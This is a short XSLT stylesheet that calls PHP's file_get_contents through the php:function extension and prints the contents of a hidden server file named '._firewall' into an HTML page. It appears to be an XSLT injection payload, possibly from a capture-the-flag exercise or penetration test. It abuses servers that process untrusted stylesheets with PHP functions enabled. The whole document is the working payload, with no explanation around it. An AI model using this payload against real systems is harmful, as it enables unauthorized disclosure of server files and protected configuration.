<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">
  
  <xsl:template match="/">
    <html>
      <body>
        <h1>Contents of ._firewall</h1>
        <pre>
          <xsl:value-of select="php:function('file_get_contents', '._firewall')"/>
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
